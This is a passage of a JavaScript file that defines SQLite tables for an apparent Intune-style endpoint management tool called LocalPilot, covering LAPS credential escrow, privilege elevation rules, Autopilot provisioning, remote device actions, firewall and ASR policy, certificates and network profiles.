      password_age_days INTEGER NOT NULL DEFAULT 30 CHECK(password_age_days >= 1 AND password_age_days <= 365),
      post_auth_reset_enabled INTEGER NOT NULL DEFAULT 0 CHECK(post_auth_reset_enabled IN (0, 1)),
      post_auth_reset_delay_hours INTEGER NOT NULL DEFAULT 4,
      auto_enable_account INTEGER NOT NULL DEFAULT 1 CHECK(auto_enable_account IN (0, 1)),
      is_enabled INTEGER NOT NULL DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 28. LAPS_PASSWORDS (Encrypted Local Administrator Credentials & Expiration Tracking)
    CREATE TABLE IF NOT EXISTS laps_passwords (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL UNIQUE,
      account_name TEXT NOT NULL DEFAULT 'Administrator',
      encrypted_password TEXT NOT NULL,
      password_length INTEGER NOT NULL DEFAULT 16,
      complexity_level TEXT NOT NULL DEFAULT 'COMPLEX',
      last_rotated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      expires_at TEXT NOT NULL,
      rotation_status TEXT NOT NULL DEFAULT 'ACTIVE' CHECK(rotation_status IN ('ACTIVE', 'ROTATION_PENDING', 'EXPIRED')),
      last_accessed_at TEXT,
      access_count INTEGER NOT NULL DEFAULT 0,
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 29. LAPS_PASSWORD_HISTORY (Forensic Credential Archive & Rollback Vault)
    CREATE TABLE IF NOT EXISTS laps_password_history (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL,
      account_name TEXT NOT NULL,
      encrypted_password TEXT NOT NULL,
      password_length INTEGER NOT NULL,
      complexity_level TEXT NOT NULL,
      rotated_at TEXT NOT NULL,
      retired_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      rotation_reason TEXT NOT NULL DEFAULT 'SCHEDULED' CHECK(rotation_reason IN ('INITIAL_ENROLLMENT', 'SCHEDULED_EXPIRATION', 'MANUAL_REQUEST', 'POST_AUTH_RESET')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 30. LAPS_AUDIT_LOGS (Access, Reveal & Rotation Paper Trail)
    CREATE TABLE IF NOT EXISTS laps_audit_logs (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL,
      account_name TEXT NOT NULL DEFAULT 'Administrator',
      action TEXT NOT NULL CHECK(action IN ('REVEAL', 'ROTATE_REQUEST', 'ESCROW', 'HISTORY_REVEAL')),
      accessed_by TEXT NOT NULL DEFAULT 'Administrator',
      access_reason TEXT DEFAULT 'Emergency Maintenance / LAPS Password Recovery',
      ip_address TEXT DEFAULT '127.0.0.1',
      accessed_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 31. EPM_POLICIES (Endpoint Privilege Management Governance Policies)
    CREATE TABLE IF NOT EXISTS epm_policies (
      id TEXT PRIMARY KEY NOT NULL,
      name TEXT NOT NULL,
      description TEXT,
      target_group_id TEXT DEFAULT 'grp-all',
      default_elevation_action TEXT NOT NULL DEFAULT 'DENY' CHECK(default_elevation_action IN ('DENY', 'REQUIRE_JUSTIFICATION', 'AUTO_ELEVATE')),
      send_elevation_telemetry INTEGER DEFAULT 1 CHECK(send_elevation_telemetry IN (0, 1)),
      is_enabled INTEGER DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 32. EPM_ELEVATION_RULES (Granular File, Hash, and Certificate Elevation Rules)
    CREATE TABLE IF NOT EXISTS epm_elevation_rules (
      id TEXT PRIMARY KEY NOT NULL,
      policy_id TEXT NOT NULL,
      rule_name TEXT NOT NULL,
      description TEXT,
      elevation_type TEXT NOT NULL CHECK(elevation_type IN ('AUTOMATIC', 'USER_CONFIRMED', 'SUPPORT_APPROVED')),
      file_name TEXT NOT NULL,
      file_path TEXT,
      file_hash_sha256 TEXT,
      publisher_certificate TEXT,
      child_process_rule TEXT NOT NULL DEFAULT 'ELEVATE_NONE' CHECK(child_process_rule IN ('ELEVATE_NONE', 'ELEVATE_ALL_CHILDREN', 'REQUIRE_RULE_MATCH')),
      min_file_version TEXT,
      max_file_version TEXT,
      is_enabled INTEGER DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(policy_id) REFERENCES epm_policies(id) ON DELETE CASCADE
    );

    -- 33. EPM_ELEVATION_REQUESTS (Standard User Elevation Requests & Approval Queue)
    CREATE TABLE IF NOT EXISTS epm_elevation_requests (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL,
      rule_id TEXT,
      requested_by_user TEXT NOT NULL,
      file_path TEXT NOT NULL,
      file_name TEXT NOT NULL,
      file_hash_sha256 TEXT,
      file_version TEXT,
      justification TEXT NOT NULL,
      status TEXT NOT NULL DEFAULT 'PENDING' CHECK(status IN ('PENDING', 'APPROVED', 'DENIED', 'EXPIRED')),
      reviewed_by TEXT,
      reviewed_at TEXT,
      review_notes TEXT,
      expires_at TEXT,
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(rule_id) REFERENCES epm_elevation_rules(id) ON DELETE SET NULL
    );

    -- 34. EPM_ELEVATION_LOGS (Forensic Process Elevation Execution Audit Trail)
    CREATE TABLE IF NOT EXISTS epm_elevation_logs (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL,
      rule_id TEXT,
      user_name TEXT NOT NULL,
      file_path TEXT NOT NULL,
      file_name TEXT NOT NULL,
      file_hash_sha256 TEXT,
      elevation_type TEXT NOT NULL,
      justification TEXT,
      process_id INTEGER,
      parent_process_name TEXT,
      executed_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(rule_id) REFERENCES epm_elevation_rules(id) ON DELETE SET NULL
    );

    -- 35. AUTOPILOT_PROFILES (Windows Autopilot OOBE Deployment Profiles)
    CREATE TABLE IF NOT EXISTS autopilot_profiles (
      id TEXT PRIMARY KEY NOT NULL,
      name TEXT NOT NULL UNIQUE,
      description TEXT,
      deployment_mode TEXT NOT NULL DEFAULT 'USER_DRIVEN' CHECK(deployment_mode IN ('USER_DRIVEN', 'SELF_DEPLOYING')),
      join_type TEXT NOT NULL DEFAULT 'WORKGROUP_LOCAL' CHECK(join_type IN ('WORKGROUP_LOCAL', 'ENTRA_CLOUD', 'HYBRID_DOMAIN')),
      account_type TEXT NOT NULL DEFAULT 'STANDARD' CHECK(account_type IN ('STANDARD', 'ADMINISTRATOR')),
      language_locale TEXT NOT NULL DEFAULT 'os-default',
      keyboard_layout TEXT NOT NULL DEFAULT 'os-default',
      device_name_template TEXT DEFAULT 'FLEET-%RAND:4%',
      skip_eula INTEGER NOT NULL DEFAULT 1 CHECK(skip_eula IN (0, 1)),
      skip_privacy_settings INTEGER NOT NULL DEFAULT 1 CHECK(skip_privacy_settings IN (0, 1)),
      skip_user_licensing INTEGER NOT NULL DEFAULT 1 CHECK(skip_user_licensing IN (0, 1)),
      target_group_id TEXT DEFAULT 'grp-all',
      is_default INTEGER NOT NULL DEFAULT 0 CHECK(is_default IN (0, 1)),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 36. AUTOPILOT_DEVICES (Pre-provisioned Hardware Hashes & Lifecycle Registry)
    CREATE TABLE IF NOT EXISTS autopilot_devices (
      id TEXT PRIMARY KEY NOT NULL,
      serial_number TEXT NOT NULL UNIQUE,
      hardware_hash TEXT NOT NULL,
      windows_product_id TEXT DEFAULT '',
      model TEXT DEFAULT 'Generic PC',
      manufacturer TEXT DEFAULT 'OEM',
      group_tag TEXT DEFAULT '',
      assigned_user TEXT DEFAULT '',
      profile_id TEXT,
      deployment_status TEXT NOT NULL DEFAULT 'UNASSIGNED' CHECK(deployment_status IN ('UNASSIGNED', 'ASSIGNED', 'PROVISIONING', 'ENROLLED', 'FAILED')),
      device_id TEXT,
      last_contact_at TEXT,
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(profile_id) REFERENCES autopilot_profiles(id) ON DELETE SET NULL,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE SET NULL
    );

    -- 37. ENROLLMENT_STATUS_PAGE_POLICIES (ESP Progress, App Blocker & Timeout Governance)
    CREATE TABLE IF NOT EXISTS enrollment_status_page_policies (
      id TEXT PRIMARY KEY NOT NULL,
      name TEXT NOT NULL UNIQUE,
      description TEXT,
      show_progress INTEGER NOT NULL DEFAULT 1 CHECK(show_progress IN (0, 1)),
      block_until_completed INTEGER NOT NULL DEFAULT 1 CHECK(block_until_completed IN (0, 1)),
      allow_user_reset_on_failure INTEGER NOT NULL DEFAULT 1 CHECK(allow_user_reset_on_failure IN (0, 1)),
      timeout_minutes INTEGER NOT NULL DEFAULT 60 CHECK(timeout_minutes >= 10 AND timeout_minutes <= 1440),
      required_app_ids_json TEXT NOT NULL DEFAULT '[]',
      required_script_ids_json TEXT NOT NULL DEFAULT '[]',
      target_group_id TEXT DEFAULT 'grp-all',
      is_default INTEGER NOT NULL DEFAULT 0 CHECK(is_default IN (0, 1)),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 38. AUTOPILOT_PROVISIONING_EVENTS (ESP Phase Progression & Hardware Telemetry Log)
    CREATE TABLE IF NOT EXISTS autopilot_provisioning_events (
      id TEXT PRIMARY KEY NOT NULL,
      autopilot_device_id TEXT NOT NULL,
      device_id TEXT,
      phase TEXT NOT NULL CHECK(phase IN ('DEVICE_PREPARATION', 'DEVICE_SETUP', 'ACCOUNT_SETUP')),
      step_name TEXT NOT NULL,
      status TEXT NOT NULL CHECK(status IN ('IN_PROGRESS', 'COMPLETED', 'FAILED', 'SKIPPED')),
      error_code TEXT,
      details TEXT,
      timestamp TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(autopilot_device_id) REFERENCES autopilot_devices(id) ON DELETE CASCADE,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE SET NULL
    );

    -- 39. DEVICE_REMOTE_ACTIONS (Intune Device Lifecycle, Remote Lock, Reboot, Wipe, Diagnostics & Sync)
    CREATE TABLE IF NOT EXISTS device_remote_actions (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL,
      action_type TEXT NOT NULL CHECK(action_type IN (
        'REMOTE_LOCK', 'RESTART', 'SHUTDOWN', 'CANCEL_SHUTDOWN',
        'COLLECT_DIAGNOSTICS', 'FRESH_START', 'WIPE', 'RETIRE',
        'SYNC_MDM', 'DEFENDER_SCAN', 'ROTATE_BITLOCKER', 'ROTATE_LAPS'
      )),
      parameters_json TEXT NOT NULL DEFAULT '{}',
      status TEXT NOT NULL DEFAULT 'PENDING' CHECK(status IN ('PENDING', 'DISPATCHED', 'EXECUTING', 'COMPLETED', 'FAILED', 'CANCELLED')),
      error_message TEXT,
      result_data_json TEXT DEFAULT '{}',
      dispatched_at TEXT,
      completed_at TEXT,
      initiated_by TEXT DEFAULT 'LocalPilot Administrator',
      bulk_action_id TEXT,
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(bulk_action_id) REFERENCES bulk_device_actions(id) ON DELETE SET NULL
    );

    -- 40. DEVICE_DIAGNOSTICS_BUNDLES (Intune Standard Diagnostics Archive Vault)
    CREATE TABLE IF NOT EXISTS device_diagnostics_bundles (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL,
      remote_action_id TEXT,
      file_name TEXT NOT NULL,
      file_size_bytes INTEGER NOT NULL DEFAULT 0,
      content_type TEXT NOT NULL DEFAULT 'application/zip',
      categories_json TEXT NOT NULL DEFAULT '[]',
      status TEXT NOT NULL DEFAULT 'COLLECTING' CHECK(status IN ('COLLECTING', 'READY', 'FAILED')),
      storage_path TEXT NOT NULL,
      summary_json TEXT DEFAULT '{}',
      collected_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(remote_action_id) REFERENCES device_remote_actions(id) ON DELETE SET NULL
    );

    -- 41. BULK_DEVICE_ACTIONS (Multi-Device & Dynamic Group Remote Action Orchestration)
    CREATE TABLE IF NOT EXISTS bulk_device_actions (
      id TEXT PRIMARY KEY NOT NULL,
      name TEXT NOT NULL,
      action_type TEXT NOT NULL,
      target_group_id TEXT,
      parameters_json TEXT NOT NULL DEFAULT '{}',
      total_devices INTEGER NOT NULL DEFAULT 0,
      dispatched_count INTEGER NOT NULL DEFAULT 0,
      completed_count INTEGER NOT NULL DEFAULT 0,
      failed_count INTEGER NOT NULL DEFAULT 0,
      status TEXT NOT NULL DEFAULT 'DISPATCHED' CHECK(status IN ('DISPATCHED', 'IN_PROGRESS', 'COMPLETED', 'PARTIALLY_FAILED', 'FAILED')),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET NULL
    );

    -- 42. FIREWALL_RULES (Microsoft Intune Endpoint Security Firewall Rules)
    CREATE TABLE IF NOT EXISTS firewall_rules (
      id TEXT PRIMARY KEY NOT NULL,
      name TEXT NOT NULL,
      description TEXT,
      direction TEXT NOT NULL CHECK(direction IN ('INBOUND', 'OUTBOUND')),
      action TEXT NOT NULL CHECK(action IN ('ALLOW', 'BLOCK')),
      protocol TEXT NOT NULL CHECK(protocol IN ('TCP', 'UDP', 'ICMPv4', 'ICMPv6', 'ANY')),
      local_ports TEXT DEFAULT 'ANY',
      remote_ports TEXT DEFAULT 'ANY',
      local_addresses TEXT DEFAULT '*',
      remote_addresses TEXT DEFAULT '*',
      profiles_json TEXT NOT NULL DEFAULT '["Domain","Private","Public"]',
      program_path TEXT DEFAULT 'ANY',
      service_name TEXT DEFAULT 'ANY',
      target_group_id TEXT DEFAULT 'grp-all',
      enabled INTEGER DEFAULT 1 CHECK(enabled IN (0, 1)),
      priority INTEGER DEFAULT 100,
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET DEFAULT
    );

    -- 43. DEVICE_FIREWALL_STATUS (Per-Device Windows Firewall Profiles & Compliance Posture)
    CREATE TABLE IF NOT EXISTS device_firewall_status (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT UNIQUE NOT NULL,
      domain_profile_enabled INTEGER DEFAULT 1 CHECK(domain_profile_enabled IN (0, 1)),
      private_profile_enabled INTEGER DEFAULT 1 CHECK(private_profile_enabled IN (0, 1)),
      public_profile_enabled INTEGER DEFAULT 1 CHECK(public_profile_enabled IN (0, 1)),
      domain_inbound_action TEXT DEFAULT 'Block',
      private_inbound_action TEXT DEFAULT 'Block',
      public_inbound_action TEXT DEFAULT 'Block',
      stealth_mode_enabled INTEGER DEFAULT 1 CHECK(stealth_mode_enabled IN (0, 1)),
      active_rules_count INTEGER DEFAULT 0,
      compliance_status TEXT DEFAULT 'COMPLIANT' CHECK(compliance_status IN ('COMPLIANT', 'NON_COMPLIANT', 'DRIFTED', 'ERROR')),
      drift_summary_json TEXT DEFAULT '{}',
      last_audit_at TEXT,
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 44. DEVICE_LISTENING_PORTS (Fleet Network Perimeter & Open Port Sentinel)
    CREATE TABLE IF NOT EXISTS device_listening_ports (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL,
      protocol TEXT NOT NULL CHECK(protocol IN ('TCP', 'UDP')),
      local_address TEXT NOT NULL,
      local_port INTEGER NOT NULL,
      owning_process_id INTEGER,
      process_name TEXT,
      service_name TEXT,
      risk_level TEXT DEFAULT 'LOW' CHECK(risk_level IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
      status TEXT DEFAULT 'AUTHORIZED' CHECK(status IN ('AUTHORIZED', 'UNAUTHORIZED', 'SUSPICIOUS', 'EXPOSED_PUBLIC')),
      last_seen_at TEXT DEFAULT (DATETIME('now')),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      UNIQUE(device_id, protocol, local_address, local_port)
    );

    -- 45. DEVICE_SCRIPTS (Microsoft Intune Windows PowerShell Scripts Repository)
    CREATE TABLE IF NOT EXISTS device_scripts (
      id TEXT PRIMARY KEY NOT NULL,
      name TEXT NOT NULL,
      description TEXT,
      script_content TEXT NOT NULL,
      run_as_account TEXT DEFAULT 'SYSTEM' CHECK (run_as_account IN ('SYSTEM', 'USER')),
      run_as_32bit INTEGER DEFAULT 0 CHECK (run_as_32bit IN (0, 1)),
      enforce_signature_check INTEGER DEFAULT 0 CHECK (enforce_signature_check IN (0, 1)),
      timeout_seconds INTEGER DEFAULT 60 CHECK (timeout_seconds >= 5 AND timeout_seconds <= 3600),
      target_group_id TEXT DEFAULT 'grp-all',
      assignment_intent TEXT DEFAULT 'ASSIGNED' CHECK (assignment_intent IN ('ASSIGNED', 'AVAILABLE')),
      run_frequency TEXT DEFAULT 'ONCE' CHECK (run_frequency IN ('ONCE', 'SCHEDULED', 'ON_DEMAND')),
      schedule_cron TEXT,
      enabled INTEGER DEFAULT 1 CHECK (enabled IN (0, 1)),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(target_group_id) REFERENCES dynamic_groups(id) ON DELETE SET DEFAULT
    );

    -- 46. DEVICE_SCRIPT_RUNS (Device Script Execution Logs & Real-Time Output)
    CREATE TABLE IF NOT EXISTS device_script_runs (
      id TEXT PRIMARY KEY NOT NULL,
      device_id TEXT NOT NULL,
      script_id TEXT NOT NULL,
      run_mode TEXT DEFAULT 'ASSIGNED' CHECK (run_mode IN ('ASSIGNED', 'ON_DEMAND', 'SCHEDULED')),
      status TEXT DEFAULT 'PENDING' CHECK (status IN ('PENDING', 'RUNNING', 'SUCCESS', 'FAILED', 'TIMED_OUT')),
      exit_code INTEGER,
      stdout TEXT,
      stderr TEXT,
      execution_time_ms INTEGER DEFAULT 0,
      executed_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      created_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      updated_at TEXT NOT NULL DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(script_id) REFERENCES device_scripts(id) ON DELETE CASCADE
    );
  `);

  // 47–49. Attack Surface Reduction (ASR) Tables
  db.exec(`
    -- 47. ASR_POLICIES — ASR/Exploit/Network Protection policy catalog
    CREATE TABLE IF NOT EXISTS asr_policies (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT DEFAULT '',
      target_group_id TEXT DEFAULT 'grp-all',
      enabled INTEGER DEFAULT 1,
      asr_rules_json TEXT DEFAULT '{}',
      exploit_protection_json TEXT DEFAULT '{}',
      network_protection_mode TEXT DEFAULT 'AUDIT' CHECK(network_protection_mode IN ('DISABLED','AUDIT','BLOCK')),
      controlled_folder_access TEXT DEFAULT 'DISABLED' CHECK(controlled_folder_access IN ('DISABLED','AUDIT','BLOCK','BLOCK_DISK_MOD_ONLY','AUDIT_DISK_MOD_ONLY')),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    -- 48. DEVICE_ASR_STATUS — Per-device ASR posture snapshot
    CREATE TABLE IF NOT EXISTS device_asr_status (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      policy_id TEXT,
      asr_rules_status_json TEXT DEFAULT '{}',
      network_protection_mode TEXT DEFAULT 'UNKNOWN',
      controlled_folder_access TEXT DEFAULT 'UNKNOWN',
      exploit_protection_applied INTEGER DEFAULT 0,
      last_audited_at TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 49. ASR_EVENTS — Live ASR block/audit events from Windows Event Log
    CREATE TABLE IF NOT EXISTS asr_events (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      event_id INTEGER NOT NULL,
      rule_id TEXT,
      rule_name TEXT,
      action TEXT NOT NULL CHECK(action IN ('BLOCKED','AUDITED','NETWORK_BLOCKED','NETWORK_AUDITED')),
      process_name TEXT,
      target_path TEXT,
      initiating_process TEXT,
      event_source TEXT DEFAULT 'Microsoft-Windows-Windows Defender',
      occurred_at TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 50. DEVICE_ANALYTICS_SNAPSHOTS — Endpoint Analytics performance & health metrics
    CREATE TABLE IF NOT EXISTS device_analytics_snapshots (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      boot_duration_ms INTEGER DEFAULT 0,
      signin_duration_ms INTEGER DEFAULT 0,
      app_crash_count_24h INTEGER DEFAULT 0,
      app_hang_count_24h INTEGER DEFAULT 0,
      cpu_spike_pct REAL DEFAULT 0,
      ram_pressure_pct REAL DEFAULT 0,
      disk_queue_depth REAL DEFAULT 0,
      overall_health_score INTEGER DEFAULT 100,
      startup_score INTEGER DEFAULT 100,
      reliability_score INTEGER DEFAULT 100,
      resource_score INTEGER DEFAULT 100,
      snapshot_date TEXT DEFAULT (DATE('now')),
      created_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 51. APP_RELIABILITY_EVENTS — Application crash and hang telemetry (Events 1000, 1002)
    CREATE TABLE IF NOT EXISTS app_reliability_events (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      app_name TEXT NOT NULL,
      app_version TEXT DEFAULT '',
      event_type TEXT NOT NULL CHECK(event_type IN ('CRASH', 'HANG')),
      faulting_module TEXT DEFAULT '',
      exception_code TEXT DEFAULT '',
      occurred_at TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 52. EXECUTIVE_REPORTS — Compiled executive compliance & fleet audit reports
    CREATE TABLE IF NOT EXISTS executive_reports (
      id TEXT PRIMARY KEY,
      report_type TEXT NOT NULL CHECK(report_type IN ('FLEET_HEALTH', 'COMPLIANCE_AUDIT', 'SECURITY_POSTURE', 'ENDPOINT_ANALYTICS')),
      parameters_json TEXT DEFAULT '{}',
      summary_json TEXT DEFAULT '{}',
      created_by TEXT DEFAULT 'LocalPilot Administrator',
      generated_at TEXT DEFAULT (DATETIME('now'))
    );

    -- 53. ORGANIZATIONAL_MESSAGES — Branded fleet toast and taskbar announcements
    CREATE TABLE IF NOT EXISTS organizational_messages (
      id TEXT PRIMARY KEY,
      title TEXT NOT NULL,
      message_body TEXT NOT NULL,
      surface TEXT NOT NULL CHECK(surface IN ('TOAST', 'TASKBAR', 'MODAL')),
      theme TEXT DEFAULT 'INFO' CHECK(theme IN ('INFO', 'WARNING', 'CRITICAL', 'UPDATE', 'ONBOARDING')),
      target_group_id TEXT DEFAULT 'grp-all',
      action_url TEXT DEFAULT '',
      action_label TEXT DEFAULT '',
      start_date TEXT DEFAULT (DATE('now')),
      end_date TEXT,
      frequency TEXT DEFAULT 'ONCE' CHECK(frequency IN ('ONCE', 'DAILY', 'EVERY_HEARTBEAT')),
      enabled INTEGER DEFAULT 1,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    -- 54. DEVICE_MESSAGE_DELIVERIES — Delivery & interaction audit log
    CREATE TABLE IF NOT EXISTS device_message_deliveries (
      id TEXT PRIMARY KEY,
      message_id TEXT NOT NULL,
      device_id TEXT NOT NULL,
      status TEXT NOT NULL CHECK(status IN ('PENDING', 'DELIVERED', 'DISMISSED', 'ACTIONED', 'EXPIRED')),
      delivered_at TEXT,
      interacted_at TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(message_id) REFERENCES organizational_messages(id) ON DELETE CASCADE,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 55. CERTIFICATE_PROFILES — Trusted Root, Intermediate, SCEP & PKCS profiles
    CREATE TABLE IF NOT EXISTS certificate_profiles (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT DEFAULT '',
      certificate_type TEXT NOT NULL CHECK(certificate_type IN ('TRUSTED_ROOT', 'INTERMEDIATE_CA', 'SCEP', 'PKCS')),
      target_store TEXT NOT NULL CHECK(target_store IN ('LOCAL_MACHINE_ROOT', 'LOCAL_MACHINE_CA', 'LOCAL_MACHINE_MY', 'CURRENT_USER_MY')),
      target_group_id TEXT DEFAULT 'grp-all',
      certificate_data_base64 TEXT DEFAULT '',
      thumbprint TEXT DEFAULT '',
      subject_name TEXT DEFAULT '',
      validity_period_days INTEGER DEFAULT 365,
      key_storage_provider TEXT DEFAULT 'RSA' CHECK(key_storage_provider IN ('RSA', 'ECDSA', 'MS_SOFTWARE_KSP')),
      key_size INTEGER DEFAULT 2048,
      scep_server_url TEXT DEFAULT '',
      renewal_threshold_pct INTEGER DEFAULT 20,
      enabled INTEGER DEFAULT 1,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    -- 56. DEVICE_CERTIFICATES — Workstation installed certificate inventory & audit
    CREATE TABLE IF NOT EXISTS device_certificates (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      profile_id TEXT,
      thumbprint TEXT NOT NULL,
      subject TEXT NOT NULL,
      issuer TEXT NOT NULL,
      store_location TEXT NOT NULL CHECK(store_location IN ('LOCAL_MACHINE', 'CURRENT_USER')),
      store_name TEXT NOT NULL,
      not_before TEXT,
      not_after TEXT,
      days_to_expiry INTEGER DEFAULT 0,
      has_private_key INTEGER DEFAULT 0,
      status TEXT NOT NULL CHECK(status IN ('VALID', 'EXPIRING_SOON', 'EXPIRED', 'REVOKED')),
      last_scanned_at TEXT DEFAULT (DATETIME('now')),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(profile_id) REFERENCES certificate_profiles(id) ON DELETE SET NULL
    );

    -- 57. NETWORK_PROFILES — Wi-Fi & VPN Configuration Profiles (802.1X, WPA3, WireGuard, IKEv2)
    CREATE TABLE IF NOT EXISTS network_profiles (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT DEFAULT '',
      network_type TEXT NOT NULL CHECK(network_type IN ('WIFI', 'VPN')),
      target_group_id TEXT DEFAULT 'grp-all',
      connection_name TEXT NOT NULL,
      ssid TEXT DEFAULT '',
      hidden_network INTEGER DEFAULT 0 CHECK(hidden_network IN (0, 1)),
      security_type TEXT DEFAULT 'WPA2_ENTERPRISE' CHECK(security_type IN ('WPA2_PERSONAL', 'WPA3_PERSONAL', 'WPA2_ENTERPRISE', 'WPA3_ENTERPRISE', 'OPEN', 'IKEv2', 'L2TP', 'WIREGUARD', 'OPENVPN')),
      eap_type TEXT DEFAULT 'EAP_TLS' CHECK(eap_type IN ('EAP_TLS', 'PEAP', 'MSCHAPv2', 'PSK', 'CERTIFICATE', 'NONE')),
      server_address TEXT DEFAULT '',
      split_tunneling INTEGER DEFAULT 1 CHECK(split_tunneling IN (0, 1)),
      always_on INTEGER DEFAULT 0 CHECK(always_on IN (0, 1)),
      auto_connect INTEGER DEFAULT 1 CHECK(auto_connect IN (0, 1)),
      proxy_type TEXT DEFAULT 'NONE' CHECK(proxy_type IN ('NONE', 'MANUAL', 'AUTOMATIC')),
      proxy_server TEXT DEFAULT '',
      proxy_port INTEGER DEFAULT 8080,
      root_cert_thumbprint TEXT DEFAULT '',
      client_cert_thumbprint TEXT DEFAULT '',
      raw_profile_xml TEXT DEFAULT '',
